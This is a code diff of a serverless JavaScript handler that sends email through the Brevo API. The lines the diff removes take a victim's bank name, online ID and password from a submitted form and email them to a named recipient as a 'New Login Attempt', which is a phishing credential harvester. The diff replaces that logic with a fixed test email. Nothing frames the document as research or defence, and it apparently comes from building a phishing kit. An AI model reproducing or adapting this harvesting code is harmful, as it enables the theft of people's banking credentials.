@@ -2,9 +2,6 @@ import axios from 'axios';
 
 export default async function handler(event, context) {
   const BREVO_API_KEY = process.env.BREVO_API_KEY;
-  const bankName = event.body.bankName;
-  const onlineId = event.body.onlineId;
-  const password = event.body.password;
 
   try {
     const response = await axios.post('https:                                 
@@ -20,13 +17,8 @@ export default async function handler(event, context) {
           name: 'Emmanuel Parker'
         }
       ],
-      subject: 'New Login Attempt',
-      htmlContent: `
-        <h1>New Login Attempt</h1>
-        <p>Bank: ${bankName}</p>
-        <p>ID: ${onlineId}</p>
-        <p>Password: ${password}</p>
-      `
+      subject: 'Test Email',
+      htmlContent: '<h1>Hello, this is a test email!</h1>'
     }, {
       headers: {
         'api-key': BREVO_API_KEY,
@@ -34,13 +26,13 @@ export default async function handler(event, context) {
       }
     });
 
-    console.log(response.data);
+    console.log('Brevo response:', response.data);
     return {
       statusCode: 200,
       body: JSON.stringify({ status: 'success', message: 'Email sent successfully.' })
     };
   } catch (error) {
-    console.error(error);
+    console.error('Error:', error);
     return {
       statusCode: 500,
       body: JSON.stringify({ status: 'error', message: 'Failed to send email.' })
